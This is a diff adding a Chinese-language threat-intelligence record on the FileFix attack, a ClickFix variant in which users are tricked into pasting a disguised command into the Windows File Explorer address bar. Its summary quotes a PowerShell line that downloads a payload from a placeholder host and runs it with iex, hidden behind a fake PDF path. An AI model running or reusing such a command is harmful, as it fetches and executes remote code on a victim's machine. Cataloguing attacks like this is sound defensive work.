@@ -1,0 +1,34 @@
+{
+  "C1331": {
+    "title": "ClickFix变种FileFix攻击通过伪装文件路径诱导执行PowerShell命令",
+    "keywords": [
+      "ClickFix",
+      "FileFix",
+      "PowerShell",
+      "社会工程学",
+      "恶意命令",
+      "Windows",
+      "剪贴板攻击",
+      "mr.d0x"
+    ],
+    "summary": "安全研究员mr.d0x于2025年6月下旬披露了FileFix攻击，这是ClickFix的变种。攻击者诱导用户将剪贴板内容粘贴到Windows文件资源管理器地址栏，内容看似是正常文件路径，实则为PowerShell恶意命令，例如'Powershell.exe -c \"iwr malicious.site/mal.jpg|iex\" # C:\\...\\Business-RFP.pdf'。该攻击利用用户对文件路径的信任，在浏览器外执行恶意代码。",
+    "category": "news_report",
+    "relatedRisks": [
+      "R0154"
+    ],
+    "references": [
+      {
+        "title": "直击真实 ClickFix 攻击现场:一场社会工程学黑客攻击的全过程",
+        "link": "https://www.anqueke.com/post/id/310802"
+      }
+    ],
+    "updated": "2026-06-18",
+    "incidentTime": "2025-06",
+    "relatedAttackTools": [
+      "AT0075"
+    ],
+    "relatedThreatActors": [
+      "TA0018"
+    ]
+  }
+}
